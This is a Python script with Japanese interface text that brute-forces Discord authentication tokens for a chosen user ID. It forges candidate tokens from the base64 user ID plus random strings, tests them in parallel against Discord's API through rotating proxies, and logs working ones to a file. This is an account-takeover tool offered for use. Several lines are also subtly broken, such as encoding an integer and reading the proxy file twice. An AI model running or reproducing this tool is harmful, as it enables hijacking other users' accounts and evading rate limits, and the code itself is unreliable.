import httpx
import random
import base64
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore

def getproxies():
    """Proxies"""
    with open("./proxies.txt" , encoding="utf-8") as f:
        if len(f.read().splitlines()) == 0:
            return None
        else:
            proxy = random.choice(f.read().split('\n'))
            proxies = {
                "http://": "http://" + proxy,
                "https://": "https://" + proxy
            }
            return proxy

def randstr(length):
    chars = '-_1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
    return ''.join([random.choice(chars) for _ in range(length)])


thd = int(input(f"{Fore.GREEN}[?] すれっど数 > "))
amnt = int(input(f"{Fore.GREEN}[?] 実行回数 > "))
usid = int(input(f"{Fore.GREEN}[?] ユーザーID > "))
base = base64.b64encode(usid.encode()).decode() + "."
if int(usid) > 970000000000000000:
    usi = 38
else:
    usi = 27

def main():
    token = base + randstr(6) + "." + randstr(usi)
    client = httpx.Client(proxies=getproxies())
    headers = {
        "content-type": "application/json",
        "Accept-Encoding": "gzip, deflate",
        "authorization": token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
    }
    try:
        x = client.get("https://discord.com/api/v9/users/@me/library", headers=headers)
        if x.status_code == 200:
            print(f"{Fore.BLUE}[+] 生存しています - {token}")
            with open("/validtokens.txt", "a+") as f:
                f.write(f"{token}\n")
        elif x.status_code == 403 and "message" in x.json():
            print(f"{Fore.RED}[-] ロックされています - {token}")
        elif x.status_code == 401:
            print(f"{Fore.RED}[-] 無効なトークン - {token}")
        else:
            print(f"{Fore.RED}[-] 不明な状態 - {token}\n{x.json()}")
    except Exception as err:
        print(f"{Fore.RED}[-] エラー: - {token}\n{err}")
    

with ThreadPoolExecutor(max_workers=thd) as executor:
    for i in range(int(amnt)):
        executor.submit(main)